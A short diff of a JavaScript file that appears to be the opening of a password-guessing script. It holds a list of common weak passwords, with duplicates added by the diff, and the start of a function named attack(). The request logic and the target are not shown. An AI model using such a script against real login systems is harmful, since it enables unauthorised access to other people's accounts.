@@ -1,11 +1,15 @@
 const axios = require("axios");
 
 const passwords = [
+      "123456",
+  "password",
+  "qwerty",
+  "admin123",
   "123456",
   "password",
-  "admin",
   "qwerty",
-  "admin123"
+  "admin123",
+  "admin",
 ];
 
 async function attack() {
